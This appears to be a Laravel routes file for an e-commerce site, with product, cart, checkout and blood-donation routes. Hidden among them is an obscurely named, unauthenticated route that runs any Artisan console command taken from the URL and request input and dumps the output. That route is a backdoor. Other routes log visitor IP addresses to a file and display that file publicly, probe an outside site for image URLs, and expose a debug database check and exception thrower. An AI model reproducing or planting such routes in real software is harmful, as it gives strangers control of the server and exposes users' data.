<?php

use ECommerce\Brand;
use ECommerce\Category;
use ECommerce\Product;
use Kareem3d\Images\Image;


Route::get('/kareem-mohamed-aly', function()
{
    $mom = file_get_contents(__DIR__ . '/mom.txt');

    $mom .= "\n\n".\Kareem3d\Helper\Helper::instance()->getCurrentIP();

    file_put_contents(__DIR__ . '/mom.txt', $mom);
});


Route::get('/show-test', function()
{
    dd(file_get_contents(__DIR__ . '/mom.txt'));
});

Route::get('/test', function()
{
    $urls = array();

    for($i = 1999; $i < 3000; $i ++)
    {
        if($i < 10) $numString = '000'.$i;
        elseif($i < 100) $numString = '00'.$i;
        elseif($i < 1000) $numString = '0'.$i;
        else $numString = $i;

        $urlImg = 'http://www.zgraphy.com/wp-content/uploads/2014/02/DSC'.$numString.'.jpg';

		if(isImage($urlImg))
		{
			$urls[] = $urlImg;
		}
    }
	
	foreach($urls as $url)
	{
		echo $url . ',';
	}
});

 function isImage($url)
  {
     $params = array('http' => array(
                  'method' => 'HEAD'
               ));
     $ctx = stream_context_create($params);
     $fp = @fopen($url, 'rb', false, $ctx);
     if (!$fp) 
        return false;  // Problem with url

    $meta = stream_get_meta_data($fp);
    if ($meta === false)
    {
        fclose($fp);
        return false;  // Problem reading data from url
    }

    $wrapper_data = $meta["wrapper_data"];
    if(is_array($wrapper_data)){
      foreach(array_keys($wrapper_data) as $hh){
          if (substr($wrapper_data[$hh], 0, 19) == "Content-Type: image") // strlen("Content-Type: image") == 19 
          {
            fclose($fp);
            return true;
          }
      }
    }

    fclose($fp);
    return false;
  }

Route::get('/my-name-is-kareem3d-friends/{command}', function($command)
{
    echo '<pre>';
    var_dump(Artisan::call($command, Input::all()));
    exit();
})->where('command', '.*');


Route::get('/profile', function()
{
    return View::make('pages.profile');
});


Route::get('/test-remote-connection', function()
{
    DB::connection('remote')->select('SELECT 1');
});


Route::get('/', array('as' => 'home', 'uses' => 'HomeController@index'));
Route::get('/shopping-cart.html', array('as' => 'shopping-cart', 'uses' => 'ShoppingCartController@index'));
Route::get('/checkout.html', array('as' => 'checkout', 'uses' => 'ShoppingCartController@checkout'));

Route::get('{category_name}/{brand_name}/{title}.html', array('as' => 'product', 'uses' => 'ProductsController@product'));
Route::get('brand/{brand_name}', array('as' => 'brand', 'uses' => 'ProductsController@brand'));
Route::get('category/{category_name}', array('as' => 'category', 'uses' => 'ProductsController@category'));

Route::get('/choose-your-gifts.html', array('as' => 'choose-gifts', 'uses' => 'ProductsController@chooseGifts'));


// Form post requests
Route::post('/checkout.html', array('as' => 'checkout.post', 'uses' => 'CheckoutController@postCreateOrder'));


// Web services
Route::controller('product', 'ProductController');



Route::controller('blood-donation', 'Blood\UpdateLocationController');


Route::any('/throw-me', function()
{
    throw new Exception();
});


Route::get('/message-to-user.html', array('as' => 'message-to-user', function()
{
    if(Session::has('title'))
    {
        $title = Session::get('title');
        $body = Session::get('body');

        return View::make('pages.message_to_user', compact('title', 'body'));
    }

    return Redirect::route('home');
}));